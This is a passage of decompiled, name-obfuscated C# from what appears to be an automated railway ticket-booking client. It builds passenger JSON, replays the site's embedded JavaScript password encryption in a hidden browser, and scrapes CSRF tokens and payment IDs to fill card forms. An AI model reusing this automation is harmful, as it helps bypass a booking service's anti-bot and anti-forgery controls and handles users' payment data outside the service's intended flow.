		if (!string.IsNullOrEmpty(text3))
		{
			result = "{\"currentStatus\":\"\",\"policyNumber\":\"\",\"needVerification\":false,\"bookingStatusDetails\":\"\",\"psgnConcDOB\":\"\",\"passengerSerialNumber\":" + int_0 + ",\"currentStatusIndex\":0,\"passengerNetFare\":0,\"passengerFoodChoice\":\"\",\"softMemberId\":0,\"psgnwlType\":0,\"isInfantWithBerth\":false,\"passengerCardNumber\":\"\",\"passengerName\":\"" + text3 + "\",\"childBerthFlag\":false,\"currentCoachId\":\"\",\"currentBerthChoice\":\"\",\"passengerAge\":" + string_1 + ",\"bookingCoachId\":\"\",\"passengerGender\":\"" + string_2 + "\",\"bookingStatus\":\"\",\"passengerIcardFlag\":false,\"forGoConcessionOpted\":false,\"passengerNationality\":\"IN\",\"passengerCardStatus\":\"\",\"softMemberFlag\":false,\"psgnConcCardExpiryDate\":\"\",\"bookingBerthNo\":0,\"psgnConcCardId\":\"\",\"passengerBedrollChoice\":\"false\",\"currentBerthCode\":\"\",\"passengerCabinCoupe\":\"\",\"foodChoice\":\"\",\"passengerConcCardNo\":\"\",\"concessionOpted\":false,\"bookingBerthCode\":\"\",\"passengerCancellationDate\":\"\",\"railwayPassOpted\":false,\"passengerConcession\":\"\",\"mpID\":\"\",\"passengerCardType\":\"\",\"insuranceIssued\":\"\",\"psgnConcType\":\"GENERAL\",\"currentStatusDetails\":\"\",\"currentBerthNo\":0,\"childPassenger\":false,\"bookingStatusIndex\":0,\"passengerBerthChoice\":\"" + smethod_3(string_3) + "\"}";
		}
		return result;
	}

	public string method_2_Disha(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		string text = "Female";
		string text2 = text;
		string text3 = string_2;
		string text4 = "M";
		if (text3 == text4)
		{
			string text5 = "Male";
			text2 = text5;
		}
		string[] array = new string[9]
		{
			"",
			int_0.ToString(),
			null,
			null,
			null,
			null,
			null,
			null,
			null
		};
		string text6 = " . ";
		array[2] = text6;
		string text7 = string_0;
		string oldValue = "-";
		array[3] = text7.Replace(oldValue, "");
		string text8 = ", ";
		array[4] = text8;
		array[5] = text2;
		string text9 = ", ";
		array[6] = text9;
		array[7] = string_1;
		string text10 = ", IN...";
		array[8] = text10;
		return string.Concat(array);
	}

	public string method_3_Disha(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = 1;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = text;
		string text3 = "false";
		string text4 = text3;
		string text5 = string_0;
		string value = "-";
		if (text5.Contains(value))
		{
			string text6 = "true";
			text2 = text6;
		}
		bool flag = num2 < 12;
		string text7 = "PT";
		if (flag & (string_8 == text7))
		{
			string text8 = "true";
			text2 = text8;
		}
		bool flag2 = num2 < 12;
		string text9 = text2;
		string text10 = "true";
		if (flag2 & (text9 != text10))
		{
			num--;
		}
		string text11 = ",\"childBerthFlag\":true";
		string text12 = text11;
		string text13 = text2;
		string text14 = "true";
		if (text13 != text14)
		{
			string text15 = ",\"childBerthFlag\":false";
			text12 = text15;
		}
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			string text16 = "true";
			text4 = text16;
		}
		if (bool_1 && !string.IsNullOrEmpty(string_5))
		{
			string text17 = string_5;
			string text18 = "No Food";
			if (!(text17 == text18))
			{
				string text19 = string_5;
				string text20 = "Veg";
				if (!(text19 == text20))
				{
					string text21 = string_5;
					string text22 = "Non-Veg";
					_ = text21 == text22;
				}
			}
		}
		string result = "";
		string text23 = text4;
		string text24 = "true";
		_ = text23 == text24;
		string text25 = string_0;
		string oldValue = "-";
		if (!string.IsNullOrEmpty(text25.Replace(oldValue, "")))
		{
			if (int_0 > 0)
			{
				string[] array = new string[13];
				string text26 = "{\"passengerGender\":\"";
				array[0] = text26;
				array[1] = string_2;
				string text27 = "\",\"passengerName\":\"";
				array[2] = text27;
				string text28 = string_0;
				string oldValue2 = "-";
				array[3] = text28.Replace(oldValue2, "");
				string text29 = "\",\"passengerAge\":\"";
				array[4] = text29;
				array[5] = string_1;
				string text30 = "\",\"passengerNationality\":\"IN\",\"isAlloted\":true,\"adult\":true,\"passengerBerthChoice\":\"";
				array[6] = text30;
				array[7] = smethod_3(string_3);
				string text31 = "\"";
				array[8] = text31;
				array[9] = text12;
				string text32 = ",\"passengerSerialNumber\":";
				array[10] = text32;
				array[11] = int_0.ToString();
				string text33 = "}";
				array[12] = text33;
				result = string.Concat(array);
			}
			else
			{
				string[] array2 = new string[11];
				string text34 = "{\"passengerGender\":\"";
				array2[0] = text34;
				array2[1] = string_2;
				string text35 = "\",\"passengerName\":\"";
				array2[2] = text35;
				string text36 = string_0;
				string oldValue3 = "-";
				array2[3] = text36.Replace(oldValue3, "");
				string text37 = "\",\"passengerAge\":\"";
				array2[4] = text37;
				array2[5] = string_1;
				string text38 = "\",\"passengerNationality\":\"IN\",\"isAlloted\":true,\"adult\":true,\"passengerBerthChoice\":\"";
				array2[6] = text38;
				array2[7] = smethod_3(string_3);
				string text39 = "\"";
				array2[8] = text39;
				array2[9] = text12;
				string text40 = "}";
				array2[10] = text40;
				result = string.Concat(array2);
			}
		}
		return result;
	}

	internal static string smethod_3(string string_8)
	{
		string result = "";
		string text = string_8.ToUpper();
		string text2 = "SIDE LOWER";
		if (!(text == text2))
		{
			string text3 = "SIDE MIDDLE";
			if (!(text == text3))
			{
				string text4 = "SIDE UPPER";
				if (!(text == text4))
				{
					string text5 = "MIDDLE";
					if (text == text5)
					{
						string text6 = "MB";
						result = text6;
					}
					else
					{
						string text7 = "UPPER";
						if (!(text == text7))
						{
							string text8 = "LOWER";
							if (text == text8)
							{
								string text9 = "LB";
								result = text9;
							}
						}
						else
						{
							string text10 = "UB";
							result = text10;
						}
					}
				}
				else
				{
					string text11 = "SU";
					result = text11;
				}
			}
			else
			{
				string text12 = "SM";
				result = text12;
			}
		}
		else
		{
			string text13 = "SL";
			result = text13;
		}
		return result;
	}

	internal static string smethod_4(string string_8, string string_9)
	{
		string[] array = new string[5];
		string text = "<script type=\"text/javascript\">\n\tfunction encryptUsingJS(e, t, n) {\r\nvar e1;\r\nvar e2;\r\nvar i = function(i) {\r\n        var r;\r\n        r ='";
		array[0] = text;
		array[1] = string_8;
		string text2 = "';\r\n        e1 = encrypt(\"password=\" + r, i);\r\n        for (var a = r.length, o = 0; a > o; o++) {\r\n            var s = r[o];\r\n                var d = r\r\n                  , u = 'ACCESS_CODE'\r\n                  , l = !0;\r\n                if (-1 != u.indexOf(\"ACCESS_CODE\")) {\r\n                    var p = d.length;\r\n                    p > 128 && (l = !1)\r\n                }\r\n                e2 = encrypt(\"password=\" + d + \"_SALT_COMPONENT_=\" + Math.random(), i);\r\n        }\r\n    }\r\n    ;\r\n    getPublicKeyFromServer(i, e)\r\n   return e1;\r\n}\r\nfunction getPublicKeyFromServer(e, t) {\r\n    var n = function(e, t, n) {\r\n        setMaxDigits(parseInt(n, 10)),\r\n        this.e = biFromHex(e),\r\n        this.m = biFromHex(t),\r\n        this.chunkSize = 2 * biHighIndex(this.m),\r\n        this.radix = 16,\r\n        this.barrett = new BarrettMu(this.m)\r\n    }\r\n      , i = '";
		array[2] = text2;
		array[3] = string_9;
		string text3 = "'\r\n      , r = i.split(\",\")[0]\r\n      , a = i.split(\",\")[1]\r\n      , o = i.split(\",\")[2]\r\n      , s = new n(r,a,o);\r\n    e(s)\r\n}\r\n\n\n    jCryption1 = function(t, n) {\r\n        var r = this;\r\n        r.$el = e(t);\r\n        r.el = t;\r\n        r.$el.data(\"jCryption\", r);\r\n        r.init = function() {\r\n            r.options = e.extend({}, e.jCryption.defaultOptions, n);\r\n            $encryptedElement = e(\"<input />\", {\r\n                type: \"hidden\",\r\n                name: r.options.postVariable\r\n            });\r\n            if (r.options.submitElement !== false)\r\n                var t = r.options.submitElement;\r\n            else\r\n                var t = r.$el.find(\":input:submit\");\r\n            t.bind(r.options.submitEvent, function() {\r\n                e(this).attr(\"disabled\", true);\r\n                if (r.options.beforeEncryption())\r\n                    e.jCryption.getKeys(r.options.getKeysURL, function(t) {\r\n                        e.jCryption.encrypt(r.$el.serialize(), t, function(t) {\r\n                            console.log(t);\r\n                            $encryptedElement.val(t);\r\n                            e(r.$el).find(\":input\").attr(\"disabled\", true).end().append($encryptedElement).submit()\r\n                        })\r\n                    });\r\n                return false\r\n            })\r\n        }\r\n        ;\r\n        r.init()\r\n    }\r\n    ;\r\n    getKeys = function(t, n) {\r\n        var r = function(e, t, n) {\r\n            setMaxDigits(parseInt(n, 10));\r\n            this.e = biFromHex(e);\r\n            this.m = biFromHex(t);\r\n            this.chunkSize = 2 * biHighIndex(this.m);\r\n            this.radix = 16;\r\n            this.barrett = new BarrettMu(this.m)\r\n        }\r\n        ;\r\n        e.getJSON(t, function(t) {\r\n            keys = new r(t.e,t.n,t.maxdigits);\r\n            if (e.isFunction(n))\r\n                n.call(this, keys)\r\n        })\r\n    }\r\n    ;\r\n    encrypt = function(t, n) {\r\n        function h(t) {\r\n            function f() {\r\n                u = new BigInt;\r\n                o = 0;\r\n                for (var l = s; l < s + n.chunkSize; ++o) {\r\n                    u.digits[o] = t[l++];\r\n                    u.digits[o] += t[l++] << 8\r\n                }\r\n                var c = n.barrett.powMod(u, n.e);\r\n                var h = n.radix == 16 ? biToHex(c) : biToString(c, n.radix);\r\n            return h;\r\n            }\r\n            var s = 0;\r\n            var o, u;\r\n            var a = \"\";\r\n            var j=f()\r\nreturn j;\r\n        }\r\n        var s = 0;\r\n        for (var o = 0; o < t.length; o++)\r\n            s += t.charCodeAt(o);\r\n        var u = \"0123456789abcdef\";\r\n        var a = \"\";\r\n        a += u.charAt((s & 240) >> 4) + u.charAt(s & 15);\r\n        var f = a + t;\r\n        var l = [];\r\n        var c = 0;\r\n        while (c < f.length) {\r\n            l[c] = f.charCodeAt(c);\r\n            c++\r\n        }\r\n        while (l.length % n.chunkSize !== 0)\r\n            l[c++] = 0;\r\n        var y = h(l)\r\nreturn y;\r\n    }\r\n    ;\r\n    defaultOptions = {\r\n        submitElement: false,\r\n        submitEvent: \"click\",\r\n        getKeysURL: \"/jsp/jc.jsp?generateKeypair=true\",\r\n        beforeEncryption: function() {\r\n            return true\r\n        },\r\n        postVariable: \"jCryption\"\r\n    };\r\n    jCryption2 = function(t) {\r\n        return this.each(function() {\r\n            new jCryption1(this,t)\r\n        })\r\n    }\r\n\n\n\nfunction setMaxDigits(e) {\r\n    maxDigits = e;\r\n    ZERO_ARRAY = new Array(maxDigits);\r\n    for (var t = 0; t < ZERO_ARRAY.length; t++)\r\n        ZERO_ARRAY[t] = 0;\r\n    bigZero = new BigInt;\r\n    bigOne = new BigInt;\r\n    bigOne.digits[0] = 1\r\n}\r\nfunction BigInt(e) {\r\n    if (typeof e == \"boolean\" && e == true)\r\n        this.digits = null ;\r\n    else\r\n        this.digits = ZERO_ARRAY.slice(0);\r\n    this.isNeg = false\r\n}\r\nfunction biFromDecimal(e) {\r\n    var t = e.charAt(0) == \"-\";\r\n    var n = t ? 1 : 0;\r\n    var r;\r\n    while (n < e.length && e.charAt(n) == \"0\")\r\n        ++n;\r\n    if (n == e.length)\r\n        r = new BigInt;\r\n    else {\r\n        var i = e.length - n;\r\n        var s = i % dpl10;\r\n        if (s == 0)\r\n            s = dpl10;\r\n        r = biFromNumber(Number(e.substr(n, s)));\r\n        n += s;\r\n        while (n < e.length) {\r\n            r = biAdd(biMultiply(r, biFromNumber(1e15)), biFromNumber(Number(e.substr(n, dpl10))));\r\n            n += dpl10\r\n        }\r\n        r.isNeg = t\r\n    }\r\n    return r\r\n}\r\nfunction biCopy(e) {\r\n    var t = new BigInt(true);\r\n    t.digits = e.digits.slice(0);\r\n    t.isNeg = e.isNeg;\r\n    return t\r\n}\r\nfunction biFromNumber(e) {\r\n    var t = new BigInt;\r\n    t.isNeg = e < 0;\r\n    e = Math.abs(e);\r\n    var n = 0;\r\n    while (e > 0) {\r\n        t.digits[n++] = e & maxDigitVal;\r\n        e >>= biRadixBits\r\n    }\r\n    return t\r\n}\r\nfunction reverseStr(e) {\r\n    var t = \"\";\r\n    for (var n = e.length - 1; n > -1; --n)\r\n        t += e.charAt(n);\r\n    return t\r\n}\r\nfunction biToString(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = t;\r\n    var r = biDivideModulo(e, n);\r\n    var i = hexatrigesimalToChar[r[1].digits[0]];\r\n    while (biCompare(r[0], bigZero) == 1) {\r\n        r = biDivideModulo(r[0], n);\r\n        digit = r[1].digits[0];\r\n        i += hexatrigesimalToChar[r[1].digits[0]]\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(i)\r\n}\r\nfunction biToDecimal(e) {\r\n    var t = new BigInt;\r\n    t.digits[0] = 10;\r\n    var n = biDivideModulo(e, t);\r\n    var r = String(n[1].digits[0]);\r\n    while (biCompare(n[0], bigZero) == 1) {\r\n        n = biDivideModulo(n[0], t);\r\n        r += String(n[1].digits[0])\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(r)\r\n}\r\nfunction digitToHex(e) {\r\n    var t = 15;\r\n    var n = \"\";\r\n    for (i = 0; i < 4; ++i) {\r\n        n += hexToChar[e & t];\r\n        e >>>= 4\r\n    }\r\n    return reverseStr(n)\r\n}\r\nfunction biToHex(e) {\r\n    var t = \"\";\r\n    var n = biHighIndex(e);\r\n    for (var r = biHighIndex(e); r > -1; --r)\r\n        t += digitToHex(e.digits[r]);\r\n    return t\r\n}\r\nfunction charToHex(e) {\r\n    var t = 48;\r\n    var n = t + 9;\r\n    var r = 97;\r\n    var i = r + 25;\r\n    var s = 65;\r\n    var o = 65 + 25;\r\n    var u;\r\n    if (e >= t && e <= n)\r\n        u = e - t;\r\n    else if (e >= s && e <= o)\r\n        u = 10 + e - s;\r\n    else if (e >= r && e <= i)\r\n        u = 10 + e - r;\r\n    else\r\n        u = 0;\r\n    return u\r\n}\r\nfunction hexToDigit(e) {\r\n    var t = 0;\r\n    var n = Math.min(e.length, 4);\r\n    for (var r = 0; r < n; ++r) {\r\n        t <<= 4;\r\n        t |= charToHex(e.charCodeAt(r))\r\n    }\r\n    return t\r\n}\r\nfunction biFromHex(e) {\r\n    var t = new BigInt;\r\n    var n = e.length;\r\n    for (var r = n, i = 0; r > 0; r -= 4,\r\n    ++i)\r\n        t.digits[i] = hexToDigit(e.substr(Math.max(r - 4, 0), Math.min(r, 4)));\r\n    return t\r\n}\r\nfunction biFromString(e, t) {\r\n    var n = e.charAt(0) == \"-\";\r\n    var r = n ? 1 : 0;\r\n    var i = new BigInt;\r\n    var s = new BigInt;\r\n    s.digits[0] = 1;\r\n    for (var o = e.length - 1; o >= r; o--) {\r\n        var u = e.charCodeAt(o);\r\n        var a = charToHex(u);\r\n        var f = biMultiplyDigit(s, a);\r\n        i = biAdd(i, f);\r\n        s = biMultiplyDigit(s, t)\r\n    }\r\n    i.isNeg = n;\r\n    return i\r\n}\r\nfunction biDump(e) {\r\n    return (e.isNeg ? \"-\" : \"\") + e.digits.join(\" \")\r\n}\r\nfunction biAdd(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biSubtract(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r = 0;\r\n        var i;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            i = e.digits[s] + t.digits[s] + r;\r\n            n.digits[s] = i & 65535;\r\n            r = Number(i >= biRadix)\r\n        }\r\n        n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biSubtract(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biAdd(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r, i;\r\n        i = 0;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            r = e.digits[s] - t.digits[s] + i;\r\n            n.digits[s] = r & 65535;\r\n            if (n.digits[s] < 0)\r\n                n.digits[s] += biRadix;\r\n            i = 0 - Number(r < 0)\r\n        }\r\n        if (i == -1) {\r\n            i = 0;\r\n            for (var s = 0; s < e.digits.length; ++s) {\r\n                r = 0 - n.digits[s] + i;\r\n                n.digits[s] = r & 65535;\r\n                if (n.digits[s] < 0)\r\n                    n.digits[s] += biRadix;\r\n                i = 0 - Number(r < 0)\r\n            }\r\n            n.isNeg = !e.isNeg\r\n        } else\r\n            n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biHighIndex(e) {\r\n    var t = e.digits.length - 1;\r\n    while (t > 0 && e.digits[t] == 0)\r\n        --t;\r\n    return t\r\n}\r\nfunction biNumBits(e) {\r\n    var t = biHighIndex(e);\r\n    var n = e.digits[t];\r\n    var r = (t + 1) * bitsPerDigit;\r\n    var i;\r\n    for (i = r; i > r - bitsPerDigit; --i) {\r\n        if ((n & 32768) != 0)\r\n            break;\r\n        n <<= 1\r\n    }\r\n    return i\r\n}\r\nfunction biMultiply(e, t) {\r\n    var n = new BigInt;\r\n    var r;\r\n    var i = biHighIndex(e);\r\n    var s = biHighIndex(t);\r\n    var o, u, a;\r\n    for (var f = 0; f <= s; ++f) {\r\n        r = 0;\r\n        a = f;\r\n        for (j = 0; j <= i; ++j,\r\n        ++a) {\r\n            u = n.digits[a] + e.digits[j] * t.digits[f] + r;\r\n            n.digits[a] = u & maxDigitVal;\r\n            r = u >>> biRadixBits\r\n        }\r\n        n.digits[f + i + 1] = r\r\n    }\r\n    n.isNeg = e.isNeg != t.isNeg;\r\n    return n\r\n}\r\nfunction biMultiplyDigit(e, t) {\r\n    var n, r, i;\r\n    result = new BigInt;\r\n    n = biHighIndex(e);\r\n    r = 0;\r\n    for (var s = 0; s <= n; ++s) {\r\n        i = result.digits[s] + e.digits[s] * t + r;\r\n        result.digits[s] = i & maxDigitVal;\r\n        r = i >>> biRadixBits\r\n    }\r\n    result.digits[1 + n] = r;\r\n    return result\r\n}\r\nfunction arrayCopy(e, t, n, r, i) {\r\n    var s = Math.min(t + i, e.length);\r\n    for (var o = t, u = r; o < s; ++o,\r\n    ++u)\r\n        n[u] = e[o]\r\n}\r\nfunction biShiftLeft(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, 0, r.digits, n, r.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = r.digits.length - 1, u = o - 1; o > 0; --o,\r\n    --u)\r\n        r.digits[o] = r.digits[o] << i & maxDigitVal | (r.digits[u] & highBitMasks[i]) >>> s;\r\n    r.digits[0] = r.digits[o] << i & maxDigitVal;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biShiftRight(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, n, r.digits, 0, e.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = 0, u = o + 1; o < r.digits.length - 1; ++o,\r\n    ++u)\r\n        r.digits[o] = r.digits[o] >>> i | (r.digits[u] & lowBitMasks[i]) << s;\r\n    r.digits[r.digits.length - 1] >>>= i;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biMultiplyByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, t, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biDivideByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, t, n.digits, 0, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biModuloByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, 0, t);\r\n    return n\r\n}\r\nfunction biCompare(e, t) {\r\n    if (e.isNeg != t.isNeg)\r\n        return 1 - 2 * Number(e.isNeg);\r\n    for (var n = e.digits.length - 1; n >= 0; --n)\r\n        if (e.digits[n] != t.digits[n])\r\n            if (e.isNeg)\r\n                return 1 - 2 * Number(e.digits[n] > t.digits[n]);\r\n            else\r\n                return 1 - 2 * Number(e.digits[n] < t.digits[n]);\r\n    return 0\r\n}\r\nfunction biDivideModulo(e, t) {\r\n    var n = biNumBits(e);\r\n    var r = biNumBits(t);\r\n    var i = t.isNeg;\r\n    var s, o;\r\n    if (n < r) {\r\n        if (e.isNeg) {\r\n            s = biCopy(bigOne);\r\n            s.isNeg = !t.isNeg;\r\n            e.isNeg = false;\r\n            t.isNeg = false;\r\n            o = biSubtract(t, e);\r\n            e.isNeg = true;\r\n            t.isNeg = i\r\n        } else {\r\n            s = new BigInt;\r\n            o = biCopy(e)\r\n        }\r\n        return new Array(s,o)\r\n    }\r\n    s = new BigInt;\r\n    o = e;\r\n    var u = Math.ceil(r / bitsPerDigit) - 1;\r\n    var a = 0;\r\n    while (t.digits[u] < biHalfRadix) {\r\n        t = biShiftLeft(t, 1);\r\n        ++a;\r\n        ++r;\r\n        u = Math.ceil(r / bitsPerDigit) - 1\r\n    }\r\n    o = biShiftLeft(o, a);\r\n    n += a;\r\n    var f = Math.ceil(n / bitsPerDigit) - 1;\r\n    var l = biMultiplyByRadixPower(t, f - u);\r\n    while (biCompare(o, l) != -1) {\r\n        ++s.digits[f - u];\r\n        o = biSubtract(o, l)\r\n    }\r\n    for (var c = f; c > u; --c) {\r\n        var h = c >= o.digits.length ? 0 : o.digits[c];\r\n        var p = c - 1 >= o.digits.length ? 0 : o.digits[c - 1];\r\n        var d = c - 2 >= o.digits.length ? 0 : o.digits[c - 2];\r\n        var v = u >= t.digits.length ? 0 : t.digits[u];\r\n        var m = u - 1 >= t.digits.length ? 0 : t.digits[u - 1];\r\n        if (h == v)\r\n            s.digits[c - u - 1] = maxDigitVal;\r\n        else\r\n            s.digits[c - u - 1] = Math.floor((h * biRadix + p) / v);\r\n        var g = s.digits[c - u - 1] * (v * biRadix + m);\r\n        var y = h * biRadixSquared + (p * biRadix + d);\r\n        while (g > y) {\r\n            --s.digits[c - u - 1];\r\n            g = s.digits[c - u - 1] * (v * biRadix | m);\r\n            y = h * biRadix * biRadix + (p * biRadix + d)\r\n        }\r\n        l = biMultiplyByRadixPower(t, c - u - 1);\r\n        o = biSubtract(o, biMultiplyDigit(l, s.digits[c - u - 1]));\r\n        if (o.isNeg) {\r\n            o = biAdd(o, l);\r\n            --s.digits[c - u - 1]\r\n        }\r\n    }\r\n    o = biShiftRight(o, a);\r\n    s.isNeg = e.isNeg != i;\r\n    if (e.isNeg) {\r\n        if (i)\r\n            s = biAdd(s, bigOne);\r\n        else\r\n            s = biSubtract(s, bigOne);\r\n        t = biShiftRight(t, a);\r\n        o = biSubtract(t, o)\r\n    }\r\n    if (o.digits[0] == 0 && biHighIndex(o) == 0)\r\n        o.isNeg = false;\r\n    return new Array(s,o)\r\n}\r\nfunction biDivide(e, t) {\r\n    return biDivideModulo(e, t)[0]\r\n}\r\nfunction biModulo(e, t) {\r\n    return biDivideModulo(e, t)[1]\r\n}\r\nfunction biMultiplyMod(e, t, n) {\r\n    return biModulo(biMultiply(e, t), n)\r\n}\r\nfunction biPow(e, t) {\r\n    var n = bigOne;\r\n    var r = e;\r\n    while (true) {\r\n        if ((t & 1) != 0)\r\n            n = biMultiply(n, r);\r\n        t >>= 1;\r\n        if (t == 0)\r\n            break;\r\n        r = biMultiply(r, r)\r\n    }\r\n    return n\r\n}\r\nfunction biPowMod(e, t, n) {\r\n    var r = bigOne;\r\n    var i = e;\r\n    var s = t;\r\n    while (true) {\r\n        if ((s.digits[0] & 1) != 0)\r\n            r = biMultiplyMod(r, i, n);\r\n        s = biShiftRight(s, 1);\r\n        if (s.digits[0] == 0 && biHighIndex(s) == 0)\r\n            break;\r\n        i = biMultiplyMod(i, i, n)\r\n    }\r\n    return r\r\n}\r\nfunction BarrettMu(e) {\r\n    this.modulus = biCopy(e);\r\n    this.k = biHighIndex(this.modulus) + 1;\r\n    var t = new BigInt;\r\n    t.digits[2 * this.k] = 1;\r\n    this.mu = biDivide(t, this.modulus);\r\n    this.bkplus1 = new BigInt;\r\n    this.bkplus1.digits[this.k + 1] = 1;\r\n    this.modulo = BarrettMu_modulo;\r\n    this.multiplyMod = BarrettMu_multiplyMod;\r\n    this.powMod = BarrettMu_powMod\r\n}\r\nfunction BarrettMu_modulo(e) {\r\n    var t = biDivideByRadixPower(e, this.k - 1);\r\n    var n = biMultiply(t, this.mu);\r\n    var r = biDivideByRadixPower(n, this.k + 1);\r\n    var i = biModuloByRadixPower(e, this.k + 1);\r\n    var s = biMultiply(r, this.modulus);\r\n    var o = biModuloByRadixPower(s, this.k + 1);\r\n    var u = biSubtract(i, o);\r\n    if (u.isNeg)\r\n        u = biAdd(u, this.bkplus1);\r\n    var a = biCompare(u, this.modulus) >= 0;\r\n    while (a) {\r\n        u = biSubtract(u, this.modulus);\r\n        a = biCompare(u, this.modulus) >= 0\r\n    }\r\n    return u\r\n}\r\nfunction BarrettMu_multiplyMod(e, t) {\r\n    var n = biMultiply(e, t);\r\n    return this.modulo(n)\r\n}\r\nfunction BarrettMu_powMod(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = 1;\r\n    while (true) {\r\n        if ((t.digits[0] & 1) != 0)\r\n            n = this.multiplyMod(n, e);\r\n        t = biShiftRight(t, 1);\r\n        if (t.digits[0] == 0 && biHighIndex(t) == 0)\r\n            break;\r\n        e = this.multiplyMod(e, e)\r\n    }\r\n    return n\r\n}\r\nvar biRadixBase = 2;\r\nvar biRadixBits = 16;\r\nvar bitsPerDigit = biRadixBits;\r\nvar biRadix = 1 << 16;\r\nvar biHalfRadix = biRadix >>> 1;\r\nvar biRadixSquared = biRadix * biRadix;\r\nvar maxDigitVal = biRadix - 1;\r\nvar maxInteger = 9999999999999998;\r\nvar maxDigits;\r\nvar ZERO_ARRAY;\r\nvar bigZero, bigOne;\r\nvar dpl10 = 15;\r\nvar highBitMasks = new Array(0,32768,49152,57344,61440,63488,64512,65024,65280,65408,65472,65504,65520,65528,65532,65534,65535);\r\nvar hexatrigesimalToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\");\r\nvar hexToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\r\nvar lowBitMasks = new Array(0,1,3,7,15,31,63,127,255,511,1023,2047,4095,8191,16383,32767,65535);\r\n</script>";
		array[4] = text3;
		string text4 = string.Concat(array);
		string text5 = "<html>\n<head>\n\n";
		string text6 = "\n\n\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
		string text7 = text5 + text4 + text6;
		WebBrowser webBrowser = new WebBrowser();
		string urlString = "about:blank";
		webBrowser.Navigate(urlString);
		webBrowser.Document.Write(text7);
		HtmlDocument document = webBrowser.Document;
		string scriptName = "encryptUsingJS";
		return document.InvokeScript(scriptName, new object[2] { null, false }).ToString();
	}

	internal static string smethod_5(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		string string_15 = "";
		string string_16 = "";
		string string_17 = "";
		string string_18 = "";
		string string_19 = "";
		string string_20 = "";
		string text = "0";
		string string_21 = text;
		string text2 = "0";
		string string_22 = text2;
		string text3 = "D";
		if (string_12 == text3)
		{
			string[] array = new string[1];
			string text4 = "||";
			array[0] = text4;
			string[] array2 = string_9.Split(array, StringSplitOptions.None);
			string_19 = array2[0];
			string_21 = array2[1];
			string_22 = array2[2];
			string_20 = array2[3];
			string_18 = array2[6].Trim();
		}
		try
		{
			string text5 = string_8;
			string oldValue = "<input name=\"passline\"";
			string text6 = "<input name=\"passline\" value=\"";
			string text7 = "\" ";
			string_8 = text5.Replace(oldValue, text6 + string_10 + text7);
			string text8 = string_8;
			string text9 = string_8;
			string value = "<input type=\"hidden\" name=\"CSRFToken\" value=\"";
			string text10 = text8.Substring(text9.IndexOf(value) + 45);
			string text11 = text10;
			string text12 = text10;
			string value2 = "\"  />";
			text10 = text11.Substring(0, text12.IndexOf(value2));
			string string_23 = smethod_7(text10).ToString().ToUpper();
			string text13 = "D";
			if (string_12 == text13)
			{
				string text14 = string_8;
				string text15 = string_8;
				string value3 = "var paymentId =";
				string text16 = text14.Substring(text15.IndexOf(value3) + 16);
				string text17 = text16;
				string text18 = text16;
				string value4 = "\"";
				text16 = text17.Substring(0, text18.IndexOf(value4));
				string text19 = string_8;
				string text20 = string_8;
				string value5 = "var mode =";
				string text21 = text19.Substring(text20.IndexOf(value5) + 12);
				string text22 = text21;
				string text23 = text21;
				string value6 = "';";
				text21 = text22.Substring(0, text23.IndexOf(value6));
				string_13 = smethod_14(string_19, text16, text21);
				string_14 = smethod_14(string_18, text16, text21);
				string_15 = smethod_14(string_20, text16, text21);
				string_16 = smethod_14(string_21, text16, text21);
				string_17 = smethod_14(string_22, text16, text21);
			}
			string text24 = "";
			string text25 = new Class10().method_1(string_8, ref text24, bool_0: false);
			string text26 = text25;
			string oldValue2 = "&proceed=Proceed";
			string text27 = text26.Replace(oldValue2, "");
			string oldValue3 = "&cancel=Cancel";
			string text28 = text27.Replace(oldValue3, "");
			string oldValue4 = "&debiMonth=0";
			string text29 = text28.Replace(oldValue4, "");
			string oldValue5 = "&debiYear=0";
